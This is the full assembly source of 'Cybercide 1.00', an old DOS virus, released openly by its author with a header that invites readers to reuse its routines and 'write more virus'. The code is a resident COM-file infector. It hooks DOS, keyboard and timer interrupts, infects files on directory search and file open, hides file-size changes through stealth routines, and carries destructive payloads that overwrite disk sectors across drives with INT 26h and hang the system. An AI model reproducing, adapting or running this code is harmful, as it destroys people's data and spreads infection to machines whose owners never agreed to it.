                .model tiny
                .code
                org    100h

;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=;
;                    A NEW ORDER OF INTELLIGENCE PRESENTS:                     ;
;                                                                              ;
;                  Cybercide 1.00 - The original source-code                   ;
;              Copyright (c) -91 by Cruel Entity / Macaroni Ted                ;
;                                                                              ;
; This one is really old now. Mcaffe virus scanner have detected it for	       ;
; years. Therefor I've decided to realease it. I hope you'll learn some-       ;
; thing from it. You are free to use routines from it and also rebuild	       ;
; it. Just give me some credits.                                               ;
;									       ;
; I hope you'll feel the nice feeling you get when you hear that many          ;
; hard-disks have been destroyed by you virus. So keep up the good work	       ;
; and write more virus.                                                        ;
;                                                                              ;
; Of cource I can't take any responsibility for all virus-coders who	       ;
; use any of the routines in this virus.                                       ;
;									       ;
; Greetings to; God for creating AT&T's					       ;
;									       ;
; ps! Tasm /m3 and tlink /t to get this babe into executable!                  ;
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=;
start:
                call    $+3
sub_this:       pop     bp

                mov     ax,0dd22h                ;are we already in memory?
                int     21h
                cmp     ax,03d33h
                jne     $+7
                lea     dx,[bp+(cancel-sub_this)]
                jmp     far ptr dx

                mov     ax,3521h                ;get int 21h vect
                int     21h
                mov     [bp+(int_21h_off-sub_this)],bx
                mov     [bp+(int_21h_seg-sub_this)],es
                mov     ax,3509h                ;get int 9h vect
                int     21h
                mov     [bp+(int_9h_off-sub_this)],bx
                mov     [bp+(int_9h_seg-sub_this)],es
                mov     ax,351ch                ;get int 1ch vect
                int     21h
                mov     [bp+(int_1ch_off-sub_this)],bx
                mov     [bp+(int_1ch_seg-sub_this)],es

                mov     ax,cs
                dec     ax
                mov     es,ax
                mov     ax,es:[0003h]
                sub     ax,[bp+(memlen-sub_this)]
                mov     es:[0003h],ax
                mov     ax,[bp+(memlen-sub_this)]
                sub     word ptr es:[0012h],ax
                mov     es,es:[0012h]
                push    es

                lea     si,[bp+(start-sub_this)]
                mov     di,0100h
                mov     cx,[bp+(filelen-sub_this)]
                rep     movsb

                pop     ds                      ;es => ds
                mov     ax,2521h                ;new vector at ES:0100
                lea     dx,new_int_21h
                int     21h
                mov     ax,2509h                ;int 9h
                lea     dx,new_int_9h
                int     21h
                mov     ax,251ch                ;int 1ch
                lea     dx,new_int_1ch
                int     21h
cancel:
                push    cs                      ;cs => ds => es
                push    cs
                pop     ds
                pop     es

                lea     si,[bp+(first_bytes-sub_this)]
                mov     cx,3
                mov     di,100h
                rep     movsb
                sub     di,3
                jmp     far ptr di

ULTIMATHULE     DB      'nam nesut agn†m dem „nk mo „nk ,marf'
                db      'kcig xeR sluloraC ruh nes egn„l r”f ,n„ in snniM'
        ;        ^^^^^^^^^  Only a swedish poem written backwards ^^^^^^^^^
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= Resident part -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

imperial_march  dw      330,600
                dw      330,600
                dw      330,600
                dw      262,450
                dw      392,150
                dw      330,600
                dw      262,450
                dw      392,150
                dw      330,1200
                dw      494,600
                dw      494,600
                dw      494,600
                dw      523,450
                dw      392,150
                dw      330,600
                dw      262,450
                dw      392,150
                dw      330,1200
                dw      0

                db      'YTITNE na ot LEURC eb reven'
darth_return:
                push    cs
                push    cs
                pop     ds
                pop     es
                lea     si,imperial_march
darth_again:
                lodsw

                cmp     ax,0
                je      darth_end

                mov     di,ax
play:
                mov     al,0b6h
                out     43h,al
                mov     dx,12h
                mov     ax,3280h
                div     di
                out     42h,al

                mov     al,ah
                out     42h,al

                in      al,61h
                mov     ah,al
                or      al,3
                out     61h,al
delay:
                lodsw
                mov     cx,ax
m_delay:
                push    cx
                mov     cx,2700
                loop    $
                pop     cx
                loop    m_delay

                out     61h,al

                jmp     darth_again
darth_end:
                xor     al,al           ;sound off
                out     61h,al

                mov     ax,0b800h       ;print ansi
                mov     es,ax
                lea     si,darth_pic
                mov     di,3680
                mov     cx,320
                rep     movsb

                jmp     $               ;hang
                db      'ynollef ELIV a si GINKLAWYAJ'
next_hour:
                cmp     dh,0
                je      check_100th
                pop     dx
                pop     cx
                pop     ax
                jmp     exit
check_100th:
                cmp     dl,5
                jb      random_sector

                pop     dx
                pop     cx
                pop     ax
                jmp     exit
random_sector:
                pushf
                push    bx

                call    get_rnd
                mov     cx,10           ;/ 10
                xor     dx,dx
                div     cx
                mov     dx,ax           ;dx=ax

                mov     al,2h           ;drive #, start with c:
                mov     cx,1h           ;# of sectors to overwrite
                lea     bx,logo         ;address to overwriting data
loopie:
                int     26h
                popf
                inc     al
                cmp     al,25
                jne     loopie

                pop     bx
                popf

                pop     dx
                pop     cx
                pop     ax
                jmp     exit
                db      '... I SHALL FEAR NO EVIL ...'
check_time_int1c:
                mov     ah,2ch          ;get time
                int     21h
                cmp     ch,16           ;>16:??
                jae     set_flag_flag
                pop     dx
                pop     cx
                pop     ax
                jmp     exit
set_flag_flag:
                mov     cs:flagga,1
                pop     dx
                pop     cx
                pop     ax
                jmp     exit

logo            db      '>>>  A.N.O.I  <<<' ; DATA to overwrite with
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
;                         New Interrupt 21h Handler
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
new_int_21h:
                pushf

                cmp     ax,0dd22h               ;mem check
                je      mem_check

                cmp     ah,2ch                  ;time?
                je      exit

                cmp     ah,2ah                  ;date?
                je      exit

                cmp     ah,9
                je      exit

                cmp     ah,11h
                je      find_old
                cmp     ah,12h
                je      find_old

                cmp     ah,4eh                  ;dos 2.x
                je      find_
                cmp     ah,4fh
                je      find_
                cmp     ah,3dh                  ;open file
                je      open_file

                push    ax
                push    cx
                push    dx

                mov     ah,2ch
                int     21h

                cmp     ch,00                   ;24:??
                jne     $+7
                lea     dx,darth_return
                jmp     far ptr dx

                cmp     cl,00                   ;a new hour?
                jne     $+7
                lea     ax,next_hour
                jmp     far ptr ax

                mov     ah,2ah                  ;get date
                int     21h

                cmp     al,6                    ;flag time? (SAT)
                je      check_time_int1c        ;check time

                pop     dx
                pop     cx
                pop     ax
exit:
                popf

real_int_21h:   db      0eah            ;jmp...
int_21h_off     dw      ?               ;to old int 21h
int_21h_seg     dw      ?

call_int21h:
                jmp     dword ptr cs:int_21h_off   ;force a call to DOS
                ret
open_file:
                push    bp
                lea     bp,open
                jmp     far ptr bp
find_:
                push    bp
                lea     bp,find_new
                jmp     far ptr bp
mem_check:
                popf
                mov     ax,3d33h
                iret

;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
;                                 Stealth FCB
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

find_old:
                popf

                pushf                           ;find fcb
                push    cs
                call    call_int21h
                cmp     al,0ffh
                je      no_more_files

                pushf
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    ds
                push    es
                push    bp

                mov     ah,2fh                  ;get dta
                int     21h

                push    es              ;es:bx
                pop     ds              ;ds:bx
                mov     si,bx           ;ds:si

                add     si,16           ;ext name
                lodsw
                cmp     ax,'OC'         ;.CO
                jne     cancel_ff
                lodsb
                cmp     al,'M'          ;M
                jne     cancel_ff
ext_ok:
                                         ;ext=com
                mov     si,bx           ;check size
                add     si,26h
                lodsw
                cmp     ax,0            ;=> 0ffffh?
                jne     cancel_ff

                mov     si,bx           ;check if already infected
                add     si,30
                lodsw                   ;time
                and     al,00011111b
                cmp     al,12
                je      $+7            ;already infected (sec=24)
                lea     dx,infect
                jmp     far ptr dx

                mov     si,bx           ;alter size
                add     si,36
                mov     di,si
                lodsw
                sub     ax,cs:filelen
                jz      cancel_ff
                stosw
cancel_ff:
                pop     bp
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                popf
no_more_files:  retf    2               ;iret flags
cancel_inf:
                pop     ax
                pop     ax
                jmp     cancel_ff

;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
;                                 Stealth 4Eh
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
find_new:
                pop     bp
                popf

                pushf                           ;find 4e
                push    cs
                call    call_int21h
                jnc     more_files
                retf    2
more_files:
                pushf
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    ds
                push    es
                push    bp

                mov     ah,2fh                  ;get dta
                int     21h

                push    es              ;es:bx
                pop     ds              ;ds:bx

                mov     si,bx           ;ds:si

                add     si,16h
                push    si              ;ONLY for infection
                push    es

                mov     si,bx

                push    cs              ;cs => es
                pop     es

                add     si,1eh          ;f name
                lea     di,filename
                mov     cx,25
get_fname:
                lodsb
                cmp     al,0
                je      get_f_klar
                stosb
                loop    get_fname
get_f_klar:
                mov     al,0            ;asciiz
                stosb

                push    ds              ;ds=> es
                pop     es
                push    cs              ;cs=> ds
                pop     ds
                mov     si,di

                sub     si,4            ;'COM'
                lodsw                   ;CO

                cmp     ax,'OC'
                je      check_m
                cmp     ax,'oc'
                jne     cancel_new
check_m:
                lodsb
                cmp     al,'m'
                je      ext_is_com
                cmp     al,'M'
                jne     cancel_new
ext_is_com:
                push    es              ;es=> ds
                pop     ds

                mov     si,bx
                add     si,1ch          ;check size
                lodsw
                cmp     ax,0            ;=> 0ffffh
                jne     cancel_new

                mov     si,bx
                add     si,16h
                lodsw                   ;time
                and     al,00011111b
                cmp     al,12
                jne     attrib_check     ;already infected (sec=24)

                mov     si,bx
                add     si,1ah
                mov     di,si
                lodsw                   ;alter size
                sub     ax,cs:filelen
                jz      cancel_new
                stosw
cancel_new:
                pop     ax              ;crap...
                pop     ax

                pop     bp
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                popf
no_more_files2: retf    2               ;iret flags

;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
;                                    Infect
;-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

infect:
                add     bx,30
                push    bx
                sub     bx,30
                push    es

                mov     si,bx           ;fname
                add     si,8

                push    cs              ;cs=>es
                pop     es

                lea     di,filename
                mov     cx,8
cpy_name:
                lodsb
                cmp     al,20h
                je      name_klar
                stosb
                loop    cpy_name
name_klar:
                mov     al,'.'
                stosb
                mov     si,bx
                add     si,16
                mov     cx,3
                rep     movsb
                mov     al,0
                stosb
attrib_check:
                push    cs              ;cs=> ds => es
                push    cs
                pop     ds
                pop     es

                mov     ax,4300h        ;get attrib
                lea     dx,filename
                int     21h
                mov     attribute,cx    ;save it
                xor     cx,cx
                mov     ax,4301h        ;force all attribs
                int     21h

                mov     ax,3d02h        ;open file
                pushf
                push    cs
                call    call_int21h
                jnc     $+7             ;not a valid filename
                lea     dx,cancel_inf
                jmp     far ptr dx
                mov     bx,ax           ;handle

                mov     ah,3fh          ;3 first bytes
                lea     dx,first_bytes
                mov     cx,3
                int     21h

                mov     ax,4202h        ;go eof and get size
                xor     dx,dx
                xor     cx,cx
                int     21h

                sub     ax,3
                mov     jmp_2,ax

                mov     ah,40h          ;write virus to eof
                mov     cx,filelen      ;virlen
                mov     dx,100h
                int     21h

                mov     ax,4200h        ;goto beg
                xor     cx,cx
                xor     dx,dx
                int     21h

                mov     ah,40h          ;write a jmp
                mov     cx,3
                lea     dx,jmp_1
                int     21h

                pop     ds                      ;=> DTA
                pop     si

                lodsw
                and     al,11100000b            ;secs=24
                or      al,00001100b
                mov     cx,ax
                lodsw                           ;date
                mov     dx,ax

                mov     ax,5701h                ;set time/date
                int     21h

                mov     ah,3eh
                pushf
                push    cs
                call    call_int21h             ;close file

                mov     ax,4301h                ;set attrib
                push    cs                      ;cs =>ds
                pop     ds
                mov     cx,attribute
                lea     dx,filename
                int     21h

                jmp     cancel_ff

cancel_uninf2:
                mov     ah,3eh
                pushf
                push    cs
                call    call_int21h             ;close file
cancel_uninf:
                pop     bp
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                popf

                pushf
                push    cs
                call    call_int21h
                retf    2               ;iret flags

konstig_text    db      '**CYBERCIDE** -- FLOATING THROUGH THE VOID'

;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
;                                     Open
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
open:
                pop     bp
                popf

                pushf
                push    ax
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    ds
                push    es
                push    bp

                push    ds                      ;ds=> es
                pop     es

                mov     bx,dx           ;save dx = bx
                mov     bp,ax           ;save ax = bp

                mov     di,dx
                mov     cx,025h                 ;MAX
                mov     dx,cx
                mov     al,0
                repnz   scasb
                sub     di,4
                mov     si,di
                lodsw
                cmp     ax,'OC'
                je      check_m2
                cmp     ax,'oc'
                jne     cancel_uninf
check_m2:
                lodsb
                cmp     al,'m'
                je      ext_is_com2
                cmp     al,'M'
                jne     cancel_uninf
ext_is_com2:
                mov     dx,bx                   ;restore
                mov     ax,bp                   ;restore

                pushf
                push    cs
                call    call_int21h     ;open file
                jc      cancel_uninf
                mov     bx,ax           ;handle

                mov     ax,5700h                ;get time/date
                int     21h

                and     cl,00011111b
                cmp     cl,12
                je      $+7
                lea     bp,cancel_uninf2
                jmp     far ptr bp

                mov     ax,9000h        ;temp area
                mov     ds,ax           ;ds
                mov     es,ax           ;es

                mov     ah,3fh          ;read whole file
                mov     cx,0ffffh
                mov     dx,0
                int     21h

                mov     si,0
                add     si,ax           ;add size
                sub     si,3            ;3 last bytes

                mov     di,0            ;copy 3 last bytes to
                mov     cx,3            ;beg
                rep     movsb

                push    ax
                mov     ax,4200h        ;goto beg
                mov     cx,0
                mov     dx,0
                int     21h

                pop     cx
                sub     cx,cs:filelen
                mov     ah,40h          ;write new file
                mov     dx,0
                int     21h

                mov     ah,40h          ;set eof mark
                mov     cx,0
                int     21h

                mov     ah,3eh
                pushf
                push    cs
                call    call_int21h             ;close file

                pop     bp
                pop     es
                pop     ds
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                popf

                pushf
                push    cs
                call    call_int21h             ;force open
                retf    2

;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
;                           New Interrupt 9h Handler
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
;-9h
new_int_9h:
                pushf
                push    ax
                push    bx
                push    ds

                xor     ax,ax        ;ds=> 0
                mov     ds,ax

                mov     al,byte ptr ds:[0417h]   ;bios, shift status
                and     al,8
                cmp     al,8         ;is alt active?
                jne     check_anoi   ;not pressed

                in      al,60h
                cmp     al,53h       ;del?
                jne     $+7
                lea     ax,alt_del
                jmp     far ptr ax

check_anoi:
                in      al,60h                  ;read key
                cmp     cs:anoi_flag,0
                je      check_a
                cmp     cs:anoi_flag,1
                je      check_n
                cmp     cs:anoi_flag,2
                je      check_o
                cmp     cs:anoi_flag,3
                je      check_i
                cmp     cs:anoi_flag,4
                je      anoi_
exit_zero:
                mov     cs:anoi_flag,0
                mov     cs:e_3rd,0
exit_9h:
                pop     ds
                pop     bx
                pop     ax
                popf

real_int_9h:    db      0eah            ;jmp...
int_9h_off      dw      ?               ;to old int 9h
int_9h_seg      dw      ?

anoi_flag       db      0
e_3rd           db      0
anoi_text       db      ' iS AROUND!',0

exit_anoi:
                inc     cs:e_3rd
                cmp     cs:e_3rd,10
                je      exit_zero
                jmp     exit_9h

check_a:
                cmp     al,1eh          ;'a'
                jne     exit_anoi
                mov     cs:anoi_flag,1
                jmp     exit_9h
check_n:
                cmp     al,31h          ;'n'
                jne     exit_anoi
                mov     cs:anoi_flag,2
                jmp     exit_9h
check_o:
                cmp     al,18h          ;'o'
                jne     exit_anoi
                mov     cs:anoi_flag,3
                jmp     exit_9h
check_i:
                cmp     al,17h          ;'i'
                jne     exit_anoi
                mov     cs:anoi_flag,4
                jmp     exit_9h

anoi_:
                push    bp

                mov     ah,0eh          ;print chr
                mov     bx,0
                xor     bp,bp
print_next:
                mov     al,cs:[anoi_text+bp]
                int     10h
                inc     bp
                cmp     al,0
                jne     print_next

                pop     bp
                jmp     exit_zero

alt_del:
                mov     ax,0b800h
                mov     es,ax
                mov     di,0
                mov     al,'A'
                stosb
                mov     di,158
                mov     al,'N'
                stosb
                mov     di,3998
                mov     al,'I'
                stosb
                mov     di,3840
                mov     al,'O'
                stosb

                jmp     exit_9h
darth_pic:
        DB      'Ä',30,'Ä',30,'Å',30,'Ä',30,'Ä',30,'Ä',30,' ',7,' ',7
        DB      ' ',7,' ',15,' ',15,'I',15,' ',15,'h',15,'e',15,'r',15
        DB      'e',15,'b',15,'y',15,' ',15,'p',15,'r',15,'o',15,'c',15
        DB      'l',15,'a',15,'i',15,'m',15,' ',15,'t',15,'h',15,'i',15
        DB      's',15,' ',15,'c',15,'o',15,'m',15,'p',15,'u',15,'t',15
        DB      'e',15,'r',15,' ',15,'a',15,'s',15,' ',15,'t',15,'h',15
        DB      'e',15,' ',15,'p',15,'r',15,'o',15,'p',15,'e',15,'r',15
        DB      't',15,'y',15,' ',15,'o',15,'f',15,' ',15,'A',15,'.',15
        DB      'N',15,'.',15,'O',15,'.',15,'I',15,' ',15,' ',15,' ',7
        DB      ' ',7,' ',14,'Ä',30,'Ä',30,'Å',30,'Ä',30,'Ä',30,'Ä',30
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,'!',15,'!',15,' ',15,'A',15,'L',15
        DB      'L',15,' ',15,'H',15,'A',15,'I',15,'L',15,' ',15,'D',15
        DB      'A',15,'R',15,'T',15,'H',15,' ',15,'V',15,'A',15,'D',15
        DB      'E',15,'R',15,' ',15,'!',15,'!',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15
        DB      ' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15,' ',15

;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
;                          New Interrupt 1Ch Handler
;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

new_int_1ch:
                pushf

                cmp     cs:flagga,0
                jne     print_flag
exit_1c:
                popf

real_int_1ch:   db      0eah            ;jmp...
int_1ch_off     dw      ?               ;to old int 1ch
int_1ch_seg     dw      ?
flagga          db      0               ;no flag

print_flag:
                push    ax
                push    bx
                push    cx
                push    di
                push    si
                push    ds
                push    es
                push    bp

                cld
                mov     ax,0b800h
                mov     es,ax
                mov     ds,ax

                mov     di,1
                mov     si,1
                lea     bp,tabl
                xor     ch,ch

                mov     cl,cs:[bp]
                inc     bp
again:
                mov     bl,cs:[bp]
                inc     bp
line:
                lodsb
                and     al,00000111b
                or      al,bl
                stosb
                inc     di
                inc     si
                loop    line

                mov     cl,cs:[bp]
                inc     bp
                cmp     cl,0
                jne     again

                pop     bp
                pop     es
                pop     ds
                pop     si
                pop     di
                pop     cx
                pop     bx
                pop     ax
                jmp     exit_1c

;                       # B     G      B
tabl db      35,16, 10,96, 35,16, 35,16, 10,96, 35,16, 35,16, 10,96, 35,16
     db      35,16, 10,96, 35,16, 35,16, 10,96, 35,16, 35,16, 10,96, 35,16
     db      35,16, 10,96, 35,16, 35,16, 10,96, 35,16, 35,16, 10,96, 35,16

     db      80,96,80,96,80,96,80,96

     db      35,16, 10,96, 35,16, 35,16, 10,96, 35,16, 35,16, 10,96, 35,16
     db      35,16, 10,96, 35,16, 35,16, 10,96, 35,16, 35,16, 10,96, 35,16
     db      35,16, 10,96, 35,16, 35,16, 10,96, 35,16, 35,16, 10,96, 35,16
     db      35,16, 10,96, 35,16, 35,16, 10,96, 35,16, 35,16, 10,96, 35,16,0

     DB      '-=CYBERCIDE=- 01-30-1993 * COPYRIGHT (C) 1992-93   A.N.O.I DEVELOPMENT'
get_rnd:
                push   dx
                push   cx
                push   bx
                in     al,40h                         ;'@'
                add    ax,0000
                mov    dx,0000
                mov    cx,0007
rnd_init5: 
                shl    ax,1
                rcl    dx,1
                mov    bl,al
                xor    bl,dh
                jns    rnd_init6
                inc    al
rnd_init6:
                loop   rnd_init5
                pop    bx
                mov    al,dl
                pop    cx
                pop    dx
rnd_init_ret:
                ret

filelen         dw      offset eof - offset start
memlen          dw      300
filename        db      25 dup(?)

attribute       dw      ?
jmp_1           db      0e9h
jmp_2           dw      ?
first_bytes     db      90h,0cdh,20h

eof:
                end     start